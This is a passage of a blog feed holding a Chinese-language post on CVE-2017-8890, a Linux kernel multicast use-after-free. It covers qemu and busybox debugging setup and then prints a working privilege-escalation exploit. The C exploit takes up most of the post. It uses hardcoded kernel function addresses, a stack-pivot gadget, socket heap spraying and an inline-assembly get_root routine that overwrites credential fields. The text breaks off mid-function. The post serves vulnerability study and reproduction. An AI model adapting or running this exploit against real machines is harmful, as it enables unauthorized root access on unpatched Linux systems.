href="https://www.cnblogs.com/tolimit/p/4566189.html" target="_blank" rel="noopener">https://www.cnblogs.com/tolimit/p/4566189.html</a><br><a href="https://blog.csdn.net/u013837209/article/details/56276809" target="_blank" rel="noopener">https://blog.csdn.net/u013837209/article/details/56276809</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;关于内核内存&quot;&gt;&lt;a href=&quot;#关于内核内存&quot; class=&quot;headerlink&quot; title=&quot;关于内核内存&quot;&gt;&lt;/a&gt;关于内核内存&lt;/h3&gt;&lt;p&gt;因为在做内核方面的技术,所以想要对内核内存管理做一些分析,之前看雪的老哥给我发了一些他对physmap见解,
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-8890(Phoenix Talon)</title>
    <link href="https://foyjog.github.io/2018/08/30/CVE-2017-8890-Phoenix-Talon/"/>
    <id>https://foyjog.github.io/2018/08/30/CVE-2017-8890-Phoenix-Talon/</id>
    <published>2018-08-30T05:18:22.000Z</published>
    <updated>2018-09-06T08:45:46.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直想搞这个洞,因为这是一个比较新的,影响力比较大的一个洞了,之前的两个2015的洞稍微有些久,这个是比较近的一个漏洞了.<br>手上没手机,还要等一阵子才来,所以先看了下 <a href="https://xz.aliyun.com/t/2385?accounttraceid=97124e15-b6b6-471a-919a-fd079c81cdbf" target="_blank" rel="noopener">https://xz.aliyun.com/t/2385?accounttraceid=97124e15-b6b6-471a-919a-fd079c81cdbf</a> 的文章,利用qemu进行了提权.花了很长的时间,慢慢摸索.</p><p>总的来说没啥太多可记,qemu调试的话还是比较友好,你发生了一些问题都可以通过调试来解决,rop链的构造也不算太难,只要有耐心就可以了.</p><h3 id="编译内核和设置网络"><a href="#编译内核和设置网络" class="headerlink" title="编译内核和设置网络"></a>编译内核和设置网络</h3><p>qemu和busybox的环境搭建参考3.<br>内核的话要开启<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Device Drivers</span><br><span class="line">            --&gt; Network device support</span><br><span class="line">                        --&gt; Universal TUN/TAP device driver support</span><br><span class="line">（<span class="number">2</span>）Networking support</span><br><span class="line">            --&gt; Networking options</span><br><span class="line">                        --&gt; <span class="number">802.1</span>d Ethernet Bridging</span><br></pre></td></tr></table></figure></p><p>qemu的话利用如下脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -s -kernel linux-4.10.6/arch/x86/boot/bzImage -initrd busybox-1.24.0/rootfs.img -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; --nographic  -net nic -net tap</span><br></pre></td></tr></table></figure></p><p>-net nic -net tap为配置环境<br>进入qemu之后我们执行如下操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig lo up<span class="comment">//开启lo环路</span></span><br><span class="line">ifconfig eth0 up<span class="comment">//开启ethernet</span></span><br><span class="line">route add <span class="keyword">default</span> gw <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="comment">//设置默认路由,不然的话setsockopt会返回-1,不会创建mc_list</span></span><br></pre></td></tr></table></figure></p><p>用qemu+busybox来搭环境的话刚开始会有些问题出现,但是解决过来后发现这套组合还是蛮好用的,毕竟灵活性非常之高.</p><h3 id="关于设置task-struct"><a href="#关于设置task-struct" class="headerlink" title="关于设置task_struct"></a>关于设置task_struct</h3><p>之前的一些cve可以直接利用如下语句查找到thread_info和task,但是这里不一样,看内核源码其实thread_info结构体已经有很大改变,同时TREAD_SIZE也变成了16k,这些在内核源码里都可以查找到,所以在使用一些方法去获取一些东西的时候,要多注意看源码是否有改动.从而改进方法.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print  *((struct thread_info*)(((<span class="keyword">uint32_t</span>)$sp &amp; <span class="number">0xffffe000</span>)))</span><br></pre></td></tr></table></figure></p><p>编译的vmlinux在x86目录下<br>该定义在/arch/x86/include/asm下(没有具体考证是否为该目录,但是通过gdb调试是可以得出thead_info只有一个flag的成员变量)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;<span class="comment">/* low level flags */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><p>碰到一些问题,这里发一下:</p><ol><li>qemu启动后没有回环,利用ifconfig lo up即可.</li><li>编译内核代码的时候和编译busybox之类的文件时,我觉着要把握好gcc的版本,比如我的gcc版本是2015年的,我就尽量下载2015年的busybox,这样的话麻烦会少很多,嘿嘿.</li><li>利用ctrl+a+x来退出console的qemu</li><li>Remote ‘g’ packet reply is too long:的解决办法可以通过设置set architecture来解决.(不行的话还需要修改源码,搜索即可)</li><li>在编译内核的时候要注意一些,不然会出一些小问题, <a href="https://imkira.com/a21.html" target="_blank" rel="noopener">https://imkira.com/a21.html</a> , 参考这篇文章即可.</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>总的来说这个洞利用在理解上来说还是比较简单的,堆喷占位,然后构造rop链绕过smep,执行shellcode即可.<br>自己依葫芦画瓢写了个exp,我的vmlinux和文中的不太一样,所以一般来说rop链都需要自己重新查找和编写,比较重要的是保存rbp和rsp,然后将其还原即可.<br>之前需要设置一下ulimit -n 65535即可.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/beraphin/CVE-2017-8890/blob/master/poc.cpp</span></span><br><span class="line"><span class="comment">//write by foyjog,参考 https://xz.aliyun.com/t/2385</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HELLO_WORLD_SERVER_PORT    6666 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH_OF_LISTEN_QUEUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_NAME_MAX_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_SIZE                 5000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Heap_Spray_Addr            0x000000010000000a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Stack_Pivot_addr           0xffffffff8100008d    <span class="comment">//  xchg eax, esp ; ret</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*  find_get_pid = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0xffffffff81076090</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*  pid_task     = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0xffffffff81075ff0</span>;</span><br><span class="line"><span class="keyword">bool</span> server_init=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> server_finish=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> client_finish=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> pid=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sockfd[SPRAY_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"sub    $0x180,%rsp;"</span></span><br><span class="line"><span class="string">"sub    $0x168,%rbp;"</span></span><br><span class="line">        <span class="string">"mov    pid,%edi;"</span></span><br><span class="line">        <span class="string">"callq  *find_get_pid;"</span></span><br><span class="line">        <span class="string">"mov    %rax,-0x8(%rbp);"</span></span><br><span class="line">        <span class="string">"mov    -0x8(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"mov    $0x0,%esi;"</span></span><br><span class="line">        <span class="string">"mov    %rax,%rdi;"</span></span><br><span class="line">        <span class="string">"callq  *pid_task;"</span></span><br><span class="line">        <span class="string">"mov    %rax,-0x10(%rbp);"</span></span><br><span class="line">        <span class="string">"mov    -0x10(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"mov    0x5f8(%rax),%rax;"</span></span><br><span class="line">        <span class="string">"mov    %rax,-0x18(%rbp);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x4,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x8,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0xc,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x10,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x14,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x18,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x1c,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"mov    -0x18(%rbp),%rax;"</span></span><br><span class="line">        <span class="string">"add    $0x20,%rax;"</span></span><br><span class="line">        <span class="string">"movl   $0x0,(%rax);"</span></span><br><span class="line">        <span class="string">"nop;"</span></span><br><span class="line"><span class="string">"movq $0x78185b8,%rbp;"</span></span><br><span class="line"><span class="string">"mov(%rbp),%rbp;"</span></span><br><span class="line"><span class="string">"mov%rbp,%rsp;"</span></span><br><span class="line"><span class="string">"sub $0x50,%rsp;"</span></span><br><span class="line"><span class="string">"retq;"</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_req</span> <span class="title">group</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">psin</span>=<span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;server_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;group,<span class="number">0</span>,<span class="keyword">sizeof</span>(group));</span><br><span class="line"></span><br><span class="line">    bzero(&amp;server_addr,<span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_addr.s_addr = htons(INADDR_ANY);</span><br><span class="line">    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);</span><br><span class="line"></span><br><span class="line">    psin = (struct sockaddr_in *)&amp;group.gr_group;</span><br><span class="line">    psin-&gt;sin_family = AF_INET;</span><br><span class="line">    psin-&gt;sin_addr.s_addr = htonl(inet_addr(<span class="string">"10.10.2.224"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;SPRAY_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((sockfd[i] = socket(PF_INET6, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;      </span><br><span class="line">           perror(<span class="string">"Socket"</span>);</span><br><span class="line">           <span class="built_in">exit</span>(errno);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        setsockopt(sockfd[i], SOL_IP, MCAST_JOIN_GROUP, &amp;group, <span class="keyword">sizeof</span> (group));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[heap_spray]Start!\n"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_mreq_source</span> <span class="title">mreqsrc</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;mreqsrc,<span class="number">0</span>,<span class="keyword">sizeof</span>(mreqsrc));</span><br><span class="line">    mreqsrc.imr_multiaddr.s_addr = htonl(inet_addr(<span class="string">"10.10.2.224"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> ii=<span class="number">0</span>; ii&lt;SPRAY_SIZE; ii++) &#123;     </span><br><span class="line">        <span class="keyword">int</span> ret = setsockopt(sockfd[ii], IPPROTO_IP, IP_ADD_SOURCE_MEMBERSHIP, &amp;mreqsrc, <span class="keyword">sizeof</span>(mreqsrc));</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[heap_spray]setsockopt failed!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">server</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">    bzero(&amp;server_addr,<span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_addr.s_addr = htons(INADDR_ANY);</span><br><span class="line">    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span><span class="title">group_req</span> <span class="title">group</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">psin</span>;</span></span><br><span class="line"></span><br><span class="line">    psin = (struct sockaddr_in *)&amp;group.gr_group;</span><br><span class="line">    psin-&gt;sin_family = AF_INET;</span><br><span class="line">    psin-&gt;sin_addr.s_addr = htonl(inet_addr(<span class="string">"10.10.2.224"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> server_socket = socket(PF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( server_socket &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Server]Create Socket Failed!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123; </span><br><span class="line">   <span class="keyword">int</span> opt =<span class="number">1</span>;</span><br><span class="line">       <span class="comment">//IPPROTO_IP</span></span><br><span class="line">       setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &amp;group, <span class="keyword">sizeof</span> (group));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( bind(server_socket,(struct sockaddr*)&amp;server_addr,<span class="keyword">sizeof</span>(server_addr)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Server]Server Bind Port : %d Failed!"</span>, HELLO_WORLD_SERVER_PORT); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) )</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"[Server]Server Listen Failed!"</span>); </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> length = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line"> </span><br><span class="line"> server_init=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"[Server]accept..... \n"</span>); </span><br><span class="line">    <span class="keyword">int</span> new_server_socket = accept(server_socket,(struct sockaddr*)&amp;client_addr,&amp;length);</span><br><span class="line">    <span class="keyword">if</span> ( new_server_socket &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        close(server_socket);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Server]Server Accept Failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">spray_init();</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"[Server]close new_server_socket \n"</span>);</span><br><span class="line">    close(new_server_socket);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Server]start heap spray! \n"</span>);</span><br><span class="line">heap_spray();</span><br><span class="line">    <span class="comment">//there must be a period between 2 close()???? </span></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Server]finished heap spray!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"[Server]close socket fd \n"</span>);</span><br><span class="line">    close(server_socket);</span><br><span class="line">server_finish=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">client</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">bzero(&amp;client_addr,<span class="keyword">sizeof</span>(client_addr));</span><br><span class="line">client_addr.sin_family=AF_INET;</span><br><span class="line">client_addr.sin_addr.s_addr=htons(INADDR_ANY);</span><br><span class="line">client_addr.sin_port=htons(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> client_socket=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(client_socket&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Client]Create socket failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(bind(client_socket,(struct sockaddr*)&amp;client_addr,<span class="keyword">sizeof</span>(client_addr)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[Client] client bind port failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span 